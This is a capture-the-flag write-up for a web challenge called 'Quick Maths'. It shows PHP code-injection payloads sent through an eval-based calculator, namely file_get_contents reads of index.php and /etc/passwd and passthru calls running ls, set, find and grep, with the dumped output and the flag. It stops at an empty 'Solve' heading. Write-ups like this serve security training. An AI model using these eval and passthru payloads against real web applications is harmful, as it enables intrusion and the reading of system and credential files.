### Challenge
```
Quick Maths
208
http://challenges.auctf.com:30021

two plus two is four minus three that's one quick maths

Author: shinigami
```

### Recon
* Positive functionality of math works fine
* Adding special characters like `; &&` for command injection check returns `PHP eval error`
* Code injection with PHP eval error
  - phpinfo return php details
  - get_file_contents to any url returns the respective page
    - $homepage = file_get_contents('flag.txt');echo $homepage;
      - No such file
    
    - $homepage = file_get_contents('index.php');echo $homepage;
```
    - Result"; echo evaluate(); } ?>
```
    - $homepage = file_get_contents('/etc/passwd');echo $homepage;

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/bin/false root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/bin/false
```

* We got file traversal, `shadow` returns permission denied
* Try for flag elsewhere
  * /etc/flag.txt
  * /home/flag.txt
  * flag.txt

* Try reverse shell to connect back to you, then get full system access to traverse files and read them ( we knew it did connect to http website so this should work? )

* Or System Exec directly --> `$homepage = passthru('ls');echo $homepage;`
```
Result
index.php
```
* command SET
```
APACHE_CONFDIR='/etc/apache2' APACHE_ENVVARS='/etc/apache2/envvars' APACHE_LOCK_DIR='/var/lock/apache2' APACHE_LOG_DIR='/var/log/apache2' APACHE_PID_FILE='/var/run/apache2/apache2.pid' APACHE_RUN_DIR='/var/run/apache2' APACHE_RUN_GROUP='www-data' APACHE_RUN_USER='www-data' GPG_KEYS='1A4E8B7277C42E53DBA9C7B9BCAA30EA9C0D5763 6E4F6AB321FDC07F2C332E3AC2BF0BC433CFC8B3' HOSTNAME='fa04021d0626' IFS=' ' LANG='C' OPTIND='1' PATH='/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin' PHPIZE_DEPS='autoconf dpkg-dev file g++ gcc libc-dev make pkg-config re2c' PHP_ASC_URL='https://secure.php.net/get/php-7.0.33.tar.xz.asc/from/this/mirror' PHP_CFLAGS='-fstack-protector-strong -fpic -fpie -O2' PHP_CPPFLAGS='-fstack-protector-strong -fpic -fpie -O2' PHP_EXTRA_BUILD_DEPS='apache2-dev' PHP_EXTRA_CONFIGURE_ARGS='--with-apxs2 --disable-cgi' PHP_INI_DIR='/usr/local/etc/php' PHP_LDFLAGS='-Wl,-O1 -Wl,--hash-style=both -pie' PHP_MD5='' PHP_SHA256='ab8c5be6e32b1f8d032909dedaaaa4bbb1a209e519abb01a52ce3914f9a13d96' PHP_URL='https://secure.php.net/get/php-7.0.33.tar.xz/from/this/mirror' PHP_VERSION='7.0.33' PPID='21' PS1='$ ' PS2='> ' PS4='+ ' PWD='/var/www/html' SHLVL='0'
```

* find the flag. $homepage = `passthru('find -L / -name "flag*"');echo $homepage;` --> took forever!

* grep to find the flag --> `$homepage = passthru('grep -r "auctf" *');echo $homepage;`
```
$flag = "auctf{p6p_1nj3c7i0n_iz_k3wl}";
```

### Solve